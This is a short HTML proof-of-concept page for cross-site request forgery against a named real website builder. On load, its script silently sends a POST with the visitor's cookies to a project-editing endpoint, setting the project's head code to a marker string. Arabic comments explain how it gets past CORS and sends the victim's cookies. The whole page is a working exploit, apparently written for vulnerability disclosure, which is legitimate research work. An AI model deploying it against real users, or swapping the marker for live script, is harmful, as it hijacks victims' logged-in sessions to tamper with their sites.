<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>CSRF PoC - Fetch</title></head>
<body>
<h2>Loading...</h2>
<script>
  fetch('https://tilda.cc/projects/submit/', {
    method: 'POST',
    mode: 'no-cors', // يمنع المتصفح من حظر الطلب بسبب CORS
    credentials: 'include', // يرسل الكوكيز الخاصة بالضحية
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'comm=editprojectheadcode&projectid=47575503&headcode=CSRF_POC_MARKER_12345'
  }).catch(e => console.log('Request sent (opaque response)'));
</script>
</body>
</html>
